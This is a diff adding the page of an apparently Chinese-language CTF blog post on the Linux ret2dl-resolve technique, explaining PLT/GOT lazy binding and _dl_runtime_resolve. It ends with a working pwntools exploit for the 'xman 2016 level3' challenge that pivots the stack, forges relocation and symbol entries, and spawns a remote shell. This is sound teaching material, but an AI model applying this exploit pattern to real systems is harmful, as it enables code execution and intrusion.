@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>linux pwn ret2dl-resolve | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="
+
+got表 plt表，延迟绑定流程
+
+程序第一次调用一个函数的时候，eip先跳到plt表的jmp ***指令，然后这个***地址在got表中，jmp ***表示，将无条件转移到 got表地址为***中的地址处执行指令。然后压栈一个数字，不..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">linux pwn ret2dl-resolve</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <ol>
+<li>
+<p>got表 plt表，延迟绑定流程<br>
+<img src="https://closefrom.github.io/post-images/1615580454555.png" alt="" loading="lazy"><br>
+程序第一次调用一个函数的时候，eip先跳到plt表的jmp ***指令，然后这个***地址在got表中，jmp ***表示，将无条件转移到 got表地址为***中的地址处执行指令。然后压栈一个数字，不同函数，数字也不同，并且跳转到plt表中的另一处地址指令指令：压栈一个got表地址对应的值记为got1，然后无条件跳转到got表地址对应的值记为got2，在got2处的指令就是对函数的重定位。<br>
+<img src="https://closefrom.github.io/post-images/1615580466966.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580473642.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580484604.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615580491346.png" alt="" loading="lazy"><br>
+jump到got2地址后，，准备执行_dl_runtime_resolve函数修改got表地址，指向真实的函数地址。</p>
+</li>
+<li>
+<p>_dl_runtime_resolve 具体操作：<br>
+got1 是一个 link_map指针，包含了 .dynamic 这个section：<br>
+<img src="https://closefrom.github.io/post-images/1615580505210.png" alt="" loading="lazy"><br>
+这个section的用处就是他包含了很多动态链接所需的关键信息，然后里面包含了DT_STRTAB, DT_SYMTAB, DT_JMPREL三项（可以readelf -S 程序名 查看），分别指向.dynstr, .dynsym, .rel.plt这3个section的指针</p>
+</li>
+</ol>
+<p>.dynstr  -&gt; 这个section是一个字符串表，index为0的地方永远是0，然后后面是动态链接所需的字符串，0结尾，相关数据结构引用一个字符串时，用的是相对这个section头的偏移<br>
+<img src="https://closefrom.github.io/post-images/1615580518366.png" alt="" loading="lazy"></p>
+<p>.dynsym -&gt;这个section是一个符号表（结构体数组），里面记录了各种符号的信息，每个结构体对应一个符号。<br>
+<img src="https://closefrom.github.io/post-images/1615580537877.png" alt="" loading="lazy"><br>
+如puts函数结构体：</p>
+<pre><code>
+typedef struct
+{
+  Elf32_Word    st_name; 
+  //符号名，是相对.dynstr起始的偏移，这种引用字符串的方式在前面说过了
+  Elf32_Addr    st_value;
+  Elf32_Word    st_size;
+  unsigned char st_info; //对于导入函数符号而言，它是0x12
+  unsigned char st_other;
+  Elf32_Section st_shndx;
+}Elf32_Sym; //对于导入函数符号而言，其他字段都是0
+</code></pre>
+<p>.rel.plt -&gt;这个section是一个重定位表（结构体数组），跟windows那个重定位表概念不同，每个项对应一个导入函数。<br>
+<img src="https://closefrom.github.io/post-images/1615580566275.png" alt="" loading="lazy"><br>
+结构体如下：</p>
+<pre><code>
+typedef struct
+{
+  Elf32_Addr    r_offset; //指向GOT表的指针
+  Elf32_Word    r_info;
+  //一些关于导入符号的信息，我们只关心从第二个字节开始的值((val)>>8)，忽略那个07
+  //1和3是这个导入函数的符号在.dynsym中的下标，
+  //如果往回看的话你会发现1和3刚好和.dynsym的puts和__libc_start_main对应
+} Elf32_Rel;
+</code></pre>
+<p>1._dl_runtime_resolve这个函数通过got1 指向的link_map指针，找到.dynamic 这个section<br>
+2.在.dynamic这个section取出指向.dynstr, .dynsym, .rel.plt的指针<br>
+3.然后通过 .rel.plt 的初始地址 加上 一开始push进去的数字（这个数字代表在.rel.plt中的偏移，用于找出 要导入函数的位置），就可以找到当前要导入的函数的重定位表项Elf32_Rel的指针，记作rel<br>
+4.通过rel-&gt;r_info &gt;&gt; 8 取出 第二个字节开始的数字，作为偏移计算值，计算出在.dynsym 中要导出的函数的符号表项Elf32_Sym的指针，记作sym<br>
+5.通过.dynstr + sym -&gt; st_name 得到 要导入的函数的 函数名字（字符串）<br>
+6.在动态链接库找到 这个函数的地址，并且赋值到 rel -&gt; r_offset 指向的got表位置<br>
+7.执行这个函数</p>
+<p>x32，此漏洞利用：{</p>
+<p>情况1：.dynamic 这个section可写，则可以只写修改.dynstr + sym-&gt;st_name 这个指针，指向一个可写的区域，并且在这个区域中写入system，执行system函数</p>
+<p>情况2：（前提条件：在栈溢出后程序中仍然存在至少一个未执行过的函数&amp;&amp;.dynamic 这个section可写),先修改 .dynamic 中的 .dynstr这个section对应的指针地址，指向一个可写的地址，将 .dynstr 中的内容的未执行的函数的函数名改为system，然后向这个地址写入 修改后的.dynstr 中的内容+ '/bin/sh\x00'， 并且。然后返回含有栈溢出的函数，覆盖返回地址为 未执行的函数的起始地址，（不用加个返回地址？）后面接着的是 '/bin/sh\x00' 地址 getshell （ps：？？？？？）</p>
+<p>情况3：.dynamic 这个section不可写，只有一个栈溢出漏洞，则可-&gt;劫持rbp-&gt;执行read函数，在一个可写的bss段写入'a'*0x4 +指向push got1的地址 + 一个计算好了的reloc_arg + system函数返回地址 + system所要执行的字符串地址 + (padding) +  rel和sym结构体，'system\x00\x00'，'/bin/sh\x00' -&gt;leave ret -&gt;将栈劫持到刚刚写入payload的bss段执行指令 -&gt; getshell<br>
+}</p>
+<p>x64 漏洞利于与 x32 区别：{<br>
+dym 和 rel 结构体 要对齐 0x18，也就是 两个结构体前面一定要是 0x18的倍数<br>
+reloc_argv 计算为 (fake_rel_add - rel_plt_start_add)/0x18<br>
+rel 结构体中的r_info 计算为 (fake_dym_add - dym_start_add)/0x18 &lt;&lt; 0x20 | 0x7<br>
+sym 结构体一般为<br>
+}</p>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1615580609746.png" alt="" loading="lazy"></figure>
+<pre style="white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><code>
+#xman 2016 level_3 x32 exp
+from pwn import *
+
+context.binary = './level3'
+file_elf = ELF('./level3')
+leave_ret_add = 0x8048482
+can_write_add = 0x804a3a0
+pop3_ret_add = 0x8048519 # pop esi,edi,ebp,ret
+pop_ebp_ret_add = 0x804851b
+read_add = file_elf.symbols['read']
+link = remote("192.168.93.137","6666")
+payload = 'A' * 0x8c
+payload += p32(read_add) 
+payload += p32(pop3_ret_add)
+payload += p32(0)
+payload += p32(can_write_add)
+payload += p32(0x300)
+payload += p32(pop_ebp_ret_add)
+payload += p32(can_write_add)
+payload += p32(leave_ret_add)
+
+link.recvuntil("Input:\n")
+link.send(payload)
+sym_start_add = 0x80481cc
+synstr_start_add = 0x804822c
+pushgot1_jumpgot2_add = 0x8048300
+rel_plt_start_add = 0x80482b0
+write_got = file_elf.got['write']
+fake_rel_add = can_write_add + 0x110  #大小 0x8  byte
+fake_sym_add = can_write_add + 0x11c  #大小 0x10 byte
+#因为fake_r_info的计算方法&& sym_start_add = 0x80481cc 
+#所以fake_sym_add 最后一个十六进制数一定为c
+#即：sym_start_add 与 fake_sym_add 的距离一定为0x10倍数 （sym结构体的大小）
+fake_reloc_argv = fake_rel_add - rel_plt_start_add
+#fake_reloc_argv 可以为任意值 即：fake_rel_add可为任意值（可写）
+bin_sh_add = can_write_add + 0x138
+fake_r_info = ((fake_sym_add - sym_start_add) / 0x10) << 0x8 | 0x7
+fake_st_name = can_write_add + 0x130 - synstr_start_add
+fake_rel_data = p32(write_got) + p32(fake_r_info)
+fake_sym_data = p32(fake_st_name)
+fake_sym_data += p32(0) + p32(0) + p32(0x12)
+payload2 = 'A' * 0x4
+payload2 += p32(pushgot1_jumpgot2_add)
+payload2 += p32(fake_reloc_argv)
+payload2 += p32(0)
+payload2 += p32(bin_sh_add)
+payload2 = payload2.ljust(0x110,'A')
+payload2 += fake_rel_data
+payload2 = payload2.ljust(0x120,'A')
+payload2 += fake_sym_data
+payload2 += 'system\x00\x00'
+payload2 += '/bin/sh\x00'
+
+link.send(payload2)
+link.interactive()
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://closefrom.github.io/post-images/1615580639366.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/32c3-ctf-pwn-readme/">
+                  <h3 class="post-title">
+                    32C3 CTF pwn readme
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
